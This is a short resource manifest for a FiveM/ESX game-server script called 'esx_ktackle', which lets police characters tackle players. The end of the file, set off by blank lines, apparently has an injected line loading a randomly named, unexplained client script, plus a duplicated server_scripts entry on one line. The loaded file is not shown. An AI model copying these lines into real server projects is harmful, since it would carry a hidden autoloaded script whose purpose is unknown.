resource_manifest_version '44febabe-d386-4d18-afbe-5e627f4af937'

description 'esx_ktackle - enables tackling for cops'

version '1.0.0'

server_scripts {
	'config.lua',
	'server/main.lua'
}

client_scripts {
	'config.lua',
	'client/main.lua'
}



client_script 'AeGWSkWl3.lua'
server_scripts { '@mysql-async/lib/MySQL.lua' }server_scripts { '@mysql-async/lib/MySQL.lua' }